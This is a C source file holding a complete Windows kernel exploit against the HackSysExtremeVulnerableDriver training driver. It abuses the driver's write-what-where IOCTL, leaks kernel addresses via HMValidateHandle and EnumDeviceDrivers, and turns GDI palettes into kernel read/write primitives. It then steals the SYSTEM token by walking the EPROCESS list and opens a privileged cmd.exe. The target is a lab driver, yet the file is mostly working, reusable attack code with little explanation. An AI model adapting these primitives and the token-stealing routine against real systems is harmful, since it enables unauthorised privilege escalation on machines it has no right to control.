#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#define NT_SUCCESS(status)      (status >= 0)
#define MODULE_SIZE             0x1000
#define NAME_SIZE               0x7F8
#define BUFFER_SIZE             0x3DC
#define PID_OFFSET              0x2E0
#define FLINK_OFFSET            0x2E8
#define TOKEN_OFFSET            0x358
#define IO_CODE                 0x22200B
#define ProcessBasicInformation 0

typedef struct _WRITE_WHAT_WHERE {
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS (*pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

typedef BOOL (*pIsMenu)(
    HMENU hMenu
);

typedef ULONG_PTR(*pHMValidateHandle)(
    HMENU hMenu,
    BYTE hType
);

typedef HPALETTE (*pCreatePalette)(
    const LOGPALETTE* plpal
);

pHMValidateHandle selfHMValidateHandle = NULL;
pNtQueryInformationProcess selfNtQueryInformationProcess = NULL;
HMODULE hUser32 = NULL;
HWND hWnd = NULL;
HPALETTE hPalette[2] = { 0 };
PULONG_PTR pFirstColor[2] = { 0 };
PULONG64 moduleBase[MODULE_SIZE] = { 0 }; 
CHAR buffer[BUFFER_SIZE] = { 0 };
CHAR menuName[NAME_SIZE] = { 0 };
PULONG64 kernelBase = 0;

void ErrorOutput(const char* msg)
{
    printf(msg);
    printf("[-] Error Code: %d\n", GetLastError());
    exit(1);
}

void GetHMValidateHandleAddr()
{
    hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32)
    {
        ErrorOutput("[-] Failed To Load User32.dll\n");
    }
    pIsMenu IsMenu = (pIsMenu)GetProcAddress(hUser32, "IsMenu");
    if (!IsMenu)
    {
        ErrorOutput("[-] Failed To Get IsMenu Address\n");
    }
    ULONG32 offCount = 0;
    PBYTE tmpAddr = (PBYTE)IsMenu;
    printf("[+] Get IsMenu Address: 0x%I64x\n", (ULONG64)IsMenu);
    while (*tmpAddr++ != 0xe8)
        ++offCount;
    selfHMValidateHandle = *(int*)tmpAddr + (ULONG64)(tmpAddr + 4);
    printf("[+] Get HMValidateHandle Address: 0x%I64x\n", (ULONG64)selfHMValidateHandle);
}

LRESULT SelfCallWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    // Default Message Handling
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

PULONG_PTR GetPwnd(LPCSTR menuName, LPCSTR className)
{
    HINSTANCE hInstance = GetModuleHandleA(NULL);
    WNDCLASSEXA wc = { 0 };
    wc.cbClsExtra = 0;
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.lpfnWndProc = (WNDPROC)SelfCallWindowProc;
    wc.hInstance = hInstance;
    wc.lpszMenuName = menuName;
    wc.lpszClassName = className;
    if (!RegisterClassExA(&wc))
    {
        ErrorOutput("[-] Failed To Register Class For Windows\n");
    }
    hWnd = CreateWindowExA(
        0, className, L"God Mode", 0xCF0000,
        0, 0, 300, 300,
        NULL, NULL, hInstance, NULL);
    if (!hWnd)
    {
        ErrorOutput("[-] Failed To Get HWND\n");
    }
    PULONG_PTR pWnd = selfHMValidateHandle((HMENU)hWnd, 0x1);
    if (!pWnd)
    {
        ErrorOutput("[-] Failed To Get PWND\n");
    }
    printf("[+] PWND: 0x%I64x\n", (ULONG64)pWnd);
    return pWnd;
}

ULONG64 GetMenuName(LPCSTR className)
{
    memset(menuName, 'a', NAME_SIZE);
    PULONG_PTR pWnd = GetPwnd(menuName, className);
    ULONG64 pKernelWnd = *(PULONG_PTR)((PBYTE)pWnd + 0x20);
    ULONG64 ulClientDelta = pKernelWnd - (ULONG64)pWnd;
    ULONG64 pKernelTagCLS = *(PULONG_PTR)((PBYTE)pWnd + 0xA8);
    ULONG64 pUserTagCLS = pKernelTagCLS - ulClientDelta;
    ULONG64 currMenuName = *(PULONG_PTR)(pUserTagCLS + 0x98);
    printf("[+] Get currMenuName: 0x%I64x\n", currMenuName);
    HINSTANCE hInstance = GetModuleHandleA(NULL);
    DestroyWindow(hWnd);
    UnregisterClassA(className, hInstance);
    hWnd = NULL;
    return currMenuName;
}

void GetFirstColor()
{
    PLOGPALETTE pLogPalette = malloc(sizeof(LOGPALETTE) + (BUFFER_SIZE * 4));
    if (!pLogPalette)
    {
        ErrorOutput("[-] Failed To Allocate For LOGPALETTE\n");
    }
    pLogPalette->palVersion = 0x300;
    pLogPalette->palNumEntries = BUFFER_SIZE;
    for (int i = 0; i < 0x1000; ++i)
    {
        CreatePalette(pLogPalette);
    }
    pFirstColor[0] = GetMenuName("manager") + 0x78;
    hPalette[0] = CreatePalette(pLogPalette);
    pFirstColor[1] = GetMenuName("worker") + 0x78;
    hPalette[1] = CreatePalette(pLogPalette);
    for (int i = 0; i < 2; ++i)
    {
        printf("[+] hPalette[%d]: 0x%x\n", i, (ULONG32)hPalette[i]);
        printf("[+] pFisrtColor[%d] Address: 0x%I64x\n", i, (ULONG64)pFirstColor[i]);
    }
}

void GetKernelBase()
{
    // Get the base_address of ntoskrnl.exe in kernel
    DWORD length = 0;
    if (EnumDeviceDrivers((LPVOID)moduleBase, sizeof(moduleBase), (LPDWORD)&length))
    {
        kernelBase = moduleBase[0];
        printf("[+] Kernel Base_Address: 0x%I64x\n", (ULONG64)kernelBase);
        return;
    }
    ErrorOutput("[-] Failed To Get Kernel Base_Address\n");
}

// read src to dest
void ReadMemory(ULONG64 src, PULONG64 dest, ULONG64 len)
{
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = src;
    SetPaletteEntries((ULONG64)((ULONG32)hPalette[0] & 0xFFFFFFFF), 0x0, 0x8 / 4, buffer);
    memset(buffer, 0, BUFFER_SIZE);
    GetPaletteEntries((ULONG64)((ULONG32)hPalette[1] & 0xFFFFFFFF), 0x0, len / 4, buffer);
    *dest = *(PULONG64)buffer;
}

// write src to dest
void WriteMemory(ULONG64 src, PULONG64 dest, ULONG64 len)
{
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = dest;
    SetPaletteEntries((ULONG64)((ULONG32)hPalette[0] & 0xFFFFFFFF), 0x0, 0x8 / 4, buffer);
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = src;
    SetPaletteEntries((ULONG64)((ULONG32)hPalette[1] & 0xFFFFFFFF), 0x0, len / 4, buffer);
}

void StealToken()
{
    // Get System process's address
    HMODULE hKernel = LoadLibraryA("ntoskrnl.exe");
    if (!hKernel)
    {
        ErrorOutput("[-] Failed To Load ntoskrnl.exe\n");
    }
    ULONG64 pEprocess = GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!pEprocess)
    {
        ErrorOutput("[-] Failed To Get EPROCESS Address\n");
    }
    ULONG64 PsInitialSystemProcess = pEprocess - (ULONG64)hKernel + (ULONG64)kernelBase;
    FreeLibrary(hKernel);
    printf("[+] Get PsInitialSystemProcess's Address: 0x%I64x\n", PsInitialSystemProcess);
    ReadMemory(PsInitialSystemProcess, &pEprocess, 0x8);
    printf("[+] Get System Process's Address: 0x%I64x\n", pEprocess);

    // Find current process's address
    ULONG64 currProcPid = GetCurrentProcessId();
    LIST_ENTRY processLink = { 0 };
    ReadMemory(pEprocess + FLINK_OFFSET, &processLink, 0x8);
    printf("[+] Get Flink: 0x%I64x\n", (ULONG64)processLink.Flink);
    // Loop the double linklist to find the current process
    while (1)
    {
        ULONG64 pTempEprocess = (ULONG64)processLink.Flink - FLINK_OFFSET;
        ULONG64 tempPid = 0;
        ReadMemory(pTempEprocess + PID_OFFSET, &tempPid, 0x8);
        if (tempPid == currProcPid)
        {
            printf("[+] Current Process PID: 0x%I64x\n", tempPid);
            ULONG64 token = 0;
            ReadMemory(pEprocess + TOKEN_OFFSET, &token, 0x8);
            printf("[+] System Process Token: 0x%I64x\n", token);
            WriteMemory(token, pTempEprocess + TOKEN_OFFSET, 0x8);
            break;
        }
        ReadMemory(pTempEprocess + FLINK_OFFSET, &processLink, 0x8);
        if (pEprocess == processLink.Flink)
        {
            printf("[-] Failed To Get The Current Process's EPROCESS\n");
            break;
        }
    }
}

void CommunicateWithDriver()
{
    HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ErrorOutput("[-] Failed To Open The Driver\n");
    }
    else
    {
        printf("[+] Driver Handle: %d\n", (ULONG)hDevice);
    }
    WRITE_WHAT_WHERE www = { 0 };
    www.What = &pFirstColor[1];
    www.Where = pFirstColor[0];
    ULONG retLength = 0;
    BOOL ret = DeviceIoControl(hDevice,
        IO_CODE,
        &www,
        sizeof(WRITE_WHAT_WHERE),
        NULL,
        0,
        &retLength,
        NULL);
    if (!ret)
    {
        ErrorOutput("[-] Failed To Send Message\n");
    }
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
    GetHMValidateHandleAddr();
    GetFirstColor();
    GetKernelBase();
    CommunicateWithDriver();
    StealToken();
    CreateCmd();
	return 0;
}